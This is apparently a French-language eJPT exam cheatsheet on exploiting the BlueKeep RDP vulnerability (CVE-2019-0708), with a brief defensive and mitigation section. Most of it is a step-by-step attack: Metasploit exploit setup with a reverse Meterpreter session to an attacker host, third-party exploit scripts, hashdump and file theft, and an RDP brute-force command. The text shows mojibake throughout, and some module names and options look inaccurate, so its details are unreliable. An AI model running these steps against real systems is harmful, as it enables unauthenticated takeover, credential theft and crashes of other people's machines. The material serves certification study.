# üíô BlueKeep (CVE-2019-0708) Exploitation - Cheatsheet eJPT

## üéØ 1. Vue d'ensemble de BlueKeep

### Qu'est-ce que BlueKeep ?
**BlueKeep (CVE-2019-0708)** est une vuln√©rabilit√© critique RDP qui permet :
- üí• **Remote Code Execution** sans authentification
- üîì **Acc√®s SYSTEM** direct sur la cible
- üåê **Propagation en r√©seau** (wormable)
- üéØ **Pre-authentication** - Pas de credentials requis
- ‚ö° **Exploitation rapide** - Une commande suffit

### D√©tails techniques BlueKeep
| Param√®tre | Valeur |
|-----------|--------|
| **CVE** | CVE-2019-0708 |
| **CVSS Score** | 9.8 (Critique) |
| **Service affect√©** | Remote Desktop Services (RDP) |
| **Port** | 3389 (ou ports RDP alternatifs) |
| **Authentification** | Non requise |
| **Type** | Use-After-Free dans rdpdr.sys |

### Syst√®mes vuln√©rables BlueKeep
| OS | Version | Vuln√©rable | Statut |
|----|---------|------------|---------|
| **Windows 7** | Toutes versions | ‚úÖ Oui | Critique |
| **Windows Server 2008** | Toutes versions | ‚úÖ Oui | Critique |
| **Windows Server 2008 R2** | Toutes versions | ‚úÖ Oui | Critique |
| **Windows XP** | Toutes versions | ‚ùå Non | Non affect√© |
| **Windows Vista** | Toutes versions | ‚ùå Non | Non affect√© |
| **Windows 8/8.1** | Toutes versions | ‚ùå Non | Non affect√© |
| **Windows 10** | Toutes versions | ‚ùå Non | Non affect√© |

---

## üîç 2. Reconnaissance BlueKeep

### D√©couverte RDP et version OS
```bash
# Scan de base pour RDP
nmap -p3389 -sV target
nmap -p3389,3333,13389 -sV target

# Identification OS via RDP
nmap -p3389 --script rdp-ntlm-info target
nmap -p3389 --script rdp-enum-encryption target

# Banner grabbing RDP
nc target 3389
```

### Scripts Nmap BlueKeep
```bash
# Script de d√©tection BlueKeep
nmap -p3389 --script rdp-vuln-ms19-0708 target

# Avec verbose pour plus d'infos
nmap -p3389 --script rdp-vuln-ms19-0708 --script-args unsafe=1 target

# Sur port alternatif
nmap -p3333 --script rdp-vuln-ms19-0708 target
```

### R√©sultat d√©tection BlueKeep
```bash
# Sortie positive (VULN√âRABLE) :
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-vuln-ms19-0708:
|   VULNERABLE:
|   Remote Desktop Services Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2019-0708
|     Risk factor: Critical
|     Description:
|       A vulnerability exists in Remote Desktop Services

# Sortie n√©gative (NON VULN√âRABLE) :
| rdp-vuln-ms19-0708:
|   NOT VULNERABLE:
|   Remote Desktop Services Remote Code Execution Vulnerability
```

---

## üõ†Ô∏è 3. Exploitation BlueKeep avec Metasploit

### Module BlueKeep RCE
```bash
# Lancement Metasploit
msfconsole -q

# Module d'exploitation BlueKeep
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show info
show options
```

### Configuration du module BlueKeep
```bash
# Configuration de base
set RHOSTS target_ip
set LHOST attacker_ip
set LPORT 4444

# Pour port RDP non-standard
set RPORT 3333

# V√©rification configuration
show options
show targets
show payloads
```

### Options du module BlueKeep
| Option | Description | Valeur recommand√©e |
|--------|-------------|-------------------|
| `RHOSTS` | IP cible | target_ip |
| `RPORT` | Port RDP | 3389 (d√©faut) |
| `LHOST` | IP attaquant | attacker_ip |
| `LPORT` | Port d'√©coute | 4444 |
| `TARGET` | Architecture cible | Auto (d√©faut) |
| `GROOMSIZE` | Taille du heap grooming | 200 (d√©faut) |

### Lancement exploitation BlueKeep
```bash
# V√©rification vuln√©rabilit√© (optionnel)
check

# Exploitation
exploit

# Si premi√®re tentative √©choue
exploit -j    # Mode job
exploit -z    # Pas d'interaction session
```

---

## üéØ 4. Scanner BlueKeep avec Metasploit

### Module de scan BlueKeep
```bash
# Module de d√©tection uniquement
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target_ip
set RPORT 3389
exploit

# Pour multiple cibles
set RHOSTS 192.168.1.0/24
set THREADS 20
exploit
```

### D√©tection BlueKeep sans exploitation
```bash
# Scan s√ªr sans risque de crash
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
set CHECK_ONLY true
exploit
```

---

## ‚ö†Ô∏è 5. Risques et pr√©cautions BlueKeep

### Risques de l'exploitation BlueKeep
- üí• **Crash du syst√®me** tr√®s probable
- üîÑ **Red√©marrage forc√©** de la cible
- üìä **Instabilit√© RDP** apr√®s exploitation
- üö´ **Perte de sessions** RDP actives
- ‚ö†Ô∏è **Blue Screen of Death** fr√©quent

### Pr√©cautions avant exploitation
```bash
# 1. V√©rifier que c'est un environnement de lab
echo "‚ö†Ô∏è ATTENTION: BlueKeep peut crasher le syst√®me!"

# 2. Sauvegarder √©tat si possible
# 3. Pr√©voir red√©marrage de la cible
# 4. Tester d'abord le scanner seulement

# 5. Exploitation prudente
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
check                    # V√©rifier d'abord
set GROOMSIZE 50         # R√©duire pour plus de stabilit√©
exploit
```

### Strat√©gies de stabilisation
```bash
# R√©duire agressivit√©
set GROOMSIZE 50         # Au lieu de 200
set TARGET 1             # Cible sp√©cifique si connue

# Multiple tentatives
exploit
# Si √©chec, retry
exploit
exploit
```

---

## üîß 6. Exploitation BlueKeep manuelle

### Outils tiers BlueKeep
```bash
# CVE-2019-0708 exploits externes
git clone https://github.com/zerosum0x0/CVE-2019-0708.git
cd CVE-2019-0708
python cve-2019-0708.py target_ip

# Autre impl√©mentation
git clone https://github.com/k8gege/CVE-2019-0708.git
```

### V√©rification manuelle BlueKeep
```bash
# Test avec rdesktop (crash si vuln√©rable)
timeout 10 rdesktop target:3389

# Avec scripts custom
python bluekeep_checker.py target_ip
```

---

## üñ•Ô∏è 7. Post-exploitation BlueKeep

### Session Meterpreter BlueKeep
```bash
# Si exploitation r√©ussie
getuid                   # NT AUTHORITY\SYSTEM
sysinfo                  # Infos syst√®me
getpid                   # Process ID

# Stabilisation session
ps                       # Lister processus
migrate <pid_stable>     # Migrer vers processus stable
```

### Probl√®mes post-exploitation BlueKeep
```bash
# Session instable fr√©quente
migrate <pid>            # Migration obligatoire
hashdump                 # Dump rapide avant crash
download C:\\flag.txt    # R√©cup√©ration rapide des fichiers

# Si session crash
sessions -l              # V√©rifier sessions actives
sessions -i <id>         # Reconnecter si possible
```

---

## üéØ 8. Cas d'usage sp√©cifiques eJPT

### Sc√©nario 1: Windows 7 BlueKeep
```bash
# 1. D√©couverte RDP
nmap -p3389 -sV target
# OS: Windows 7 d√©tect√©

# 2. Test BlueKeep
nmap -p3389 --script rdp-vuln-ms19-0708 target
# R√©sultat: VULNERABLE

# 3. Exploitation Metasploit
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
set LHOST attacker_ip
check
exploit

# 4. Post-exploitation si succ√®s
getuid
sysinfo
hashdump
```

### Sc√©nario 2: Server 2008 BlueKeep
```bash
# 1. Identification Server 2008
nmap -p3389 --script rdp-ntlm-info target
# Target_Name: WIN-SERVER2008

# 2. Scan BlueKeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
exploit

# 3. Si vuln√©rable ‚Üí Exploitation
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
set LHOST attacker_ip
exploit
```

### Sc√©nario 3: BlueKeep sur port alternatif
```bash
# 1. RDP sur port non-standard
nmap -p3333 -sV target
# Service: ms-wbt-server

# 2. Test BlueKeep port custom
nmap -p3333 --script rdp-vuln-ms19-0708 target

# 3. Exploitation port custom
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
set RPORT 3333
set LHOST attacker_ip
exploit
```

---

## üõ°Ô∏è 9. D√©tection et mitigation BlueKeep

### D√©tection c√¥t√© d√©fenseur
```powershell
# Logs Windows √† surveiller
# Event ID 56: RDP Terminal Services fatal error
# Event ID 1006: RDP unexpected disconnection
# Event ID 9009: RDP desktop disconnected

Get-EventLog -LogName System | Where-Object {$_.EventID -eq 56}
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational'}
```

### Mitigation BlueKeep
```bash
# M√©thodes de protection :
# 1. Appliquer patch Microsoft (KB4499180)
# 2. D√©sactiver RDP si non utilis√©
# 3. Utiliser NLA (Network Level Authentication)
# 4. Firewall : bloquer port 3389 externe
# 5. VPN obligatoire pour RDP
```

### V√©rification patch BlueKeep
```cmd
# V√©rifier si patch√©
wmic qfe list | findstr KB4499180

# Statut RDP
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
```

---

## üí° 10. Conseils et astuces eJPT

### Points critiques BlueKeep eJPT
- ‚ö†Ô∏è **Instabilit√©** : Peut crasher la cible
- üéØ **Cibles sp√©cifiques** : Windows 7/Server 2008 uniquement
- üöÄ **RCE direct** : Pas de credentials n√©cessaires
- üí• **SYSTEM imm√©diat** : Privil√®ges maximum
- üîÑ **Retry n√©cessaire** : Souvent plusieurs tentatives

### Strat√©gie d'exploitation eJPT
```bash
# 1. Toujours scanner d'abord
nmap --script rdp-vuln-ms19-0708 target

# 2. Si VULNERABLE ‚Üí Exploitation prudente
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
check                    # Double v√©rification
set GROOMSIZE 50         # Stabilit√©
exploit

# 3. Si √©chec ‚Üí Retry
exploit
exploit

# 4. Post-exploitation rapide
getuid && hashdump && search -f flag.txt
```

### Erreurs courantes BlueKeep
- ‚ùå **Ne pas v√©rifier OS** ‚Üí Exploitation sur cible non vuln√©rable
- ‚ùå **Pas de check** avant exploit ‚Üí Waste time
- ‚ùå **GROOMSIZE trop √©lev√©** ‚Üí Crash syst√®me
- ‚ùå **Pas de retry** ‚Üí Abandon trop rapide
- ‚ùå **Migration oubli√©e** ‚Üí Session instable

### Alternatives si BlueKeep √©choue
```bash
# 1. RDP brute force classique
hydra -L users.txt -P passwords.txt rdp://target

# 2. Autres vuln√©rabilit√©s RDP
nmap --script rdp-vuln-* target

# 3. Services alternatifs
nmap -sV target          # Chercher autres services
```

### Timing BlueKeep eJPT
```bash
# Workflow optimis√© (5-10 minutes)
# 1. Detection (30s)
nmap --script rdp-vuln-ms19-0708 target

# 2. Exploitation (2-3 tentatives, 2-3 min)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
check && exploit

# 3. Post-exploitation rapide (2 min max)
getuid && hashdump && search -f flag.txt

# 4. Si instable ‚Üí Dump rapide et exit
download C:\\flag.txt
```

---

## üìã 11. Checklist exploitation BlueKeep

### ‚úÖ Phase de reconnaissance
- [ ] **Port RDP** ouvert (3389 ou alternatif)
- [ ] **OS identifi√©** (Windows 7/Server 2008)
- [ ] **Script Nmap** ex√©cut√© (rdp-vuln-ms19-0708)
- [ ] **Statut VULNERABLE** confirm√©

### ‚úÖ Phase d'exploitation
- [ ] **Module MSF** charg√© (cve_2019_0708_bluekeep_rce)
- [ ] **Options configur√©es** (RHOSTS, LHOST)
- [ ] **Check** ex√©cut√© avant exploit
- [ ] **GROOMSIZE** ajust√© si besoin (50-200)
- [ ] **Exploitation** tent√©e (retry si √©chec)

### ‚úÖ Phase post-exploitation
- [ ] **Session** Meterpreter obtenue
- [ ] **Privil√®ges SYSTEM** confirm√©s (getuid)
- [ ] **Migration** effectu√©e si session instable
- [ ] **Donn√©es critiques** extraites rapidement
- [ ] **Flag** localis√© et r√©cup√©r√©

### ‚ö†Ô∏è Gestion des √©checs
- [ ] **Multiples tentatives** (3-5 fois)
- [ ] **GROOMSIZE** vari√© (50, 100, 200)
- [ ] **Alternative** envisag√©e (brute force RDP)
- [ ] **Autres services** explor√©s

### üìù Informations √† documenter
- **OS vuln√©rable** : Windows 7/Server 2008
- **Port RDP** : 3389 ou alternatif
- **Statut exploitation** : Succ√®s/√âchec
- **Privil√®ges obtenus** : SYSTEM
- **Stabilit√© session** : Stable/Instable

**üéØ Conseil final eJPT :** BlueKeep est un **exploit critique** mais **instable**. Parfait pour Windows 7/Server 2008 dans l'eJPT. Toujours v√©rifier vuln√©rabilit√© avec nmap d'abord, puis exploiter prudemment avec GROOMSIZE r√©duit. √ätre pr√™t √† retry plusieurs fois et extraire les donn√©es rapidement car la session peut crasher !